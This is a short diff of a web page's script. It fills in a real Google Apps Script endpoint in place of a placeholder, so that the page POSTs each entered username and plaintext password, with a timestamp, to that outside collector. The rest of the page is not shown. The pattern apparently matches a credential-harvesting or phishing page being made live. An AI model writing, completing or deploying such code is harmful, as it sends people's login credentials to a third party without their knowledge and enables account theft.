@@ -145,7 +145,7 @@
       const timestamp = new Date().toLocaleString(); // client timestamp
 
       try {
-        await fetch("YOUR_GOOGLE_SCRIPT_URL", {
+        await fetch("https://script.google.com/macros/s/AKfycbzqy5N2TvY8xWYbsfS7AiRfHp_cbrXsgyLuaFfSDkP4oxAmduJZQzcAq9kII_CJfMJkcw/exec", {
           method: "POST",
           body: JSON.stringify({ username, password, timestamp }),
         });
@@ -160,3 +160,4 @@
 
 </body>
 </html>
+
